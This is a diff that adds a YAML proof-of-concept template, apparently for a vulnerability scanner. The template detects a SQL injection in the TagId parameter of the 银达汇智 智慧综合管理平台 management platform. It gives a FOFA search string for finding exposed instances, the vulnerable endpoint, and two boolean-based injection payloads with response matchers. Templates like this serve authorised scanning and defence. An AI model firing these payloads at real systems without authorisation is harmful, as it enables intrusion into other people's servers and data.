@@ -1,0 +1,24 @@
+id: poc-yaml-windor-icmp-tagid-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 TagId SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 银达汇智 智慧综合管理平台
+  fofa: 汇智信息 && title==智慧综合管理平台登入
+requests:
+- method: POST
+  path: /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=findCheckData&TagId='or '1'='1
+  expression: status_code == 200 && body == "[]" && contains(headers,"SessionId")
+- method: POST
+  path: /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=findCheckData&TagId='or '1'='2
+  expression: status_code == 500 && contains(body,"未将对象引用设置到对象的实例") && contains(body,"应用程序中的服务器错误")
+    && contains(body,"System.Web.HttpApplication")
+variables: {}
+transport: http
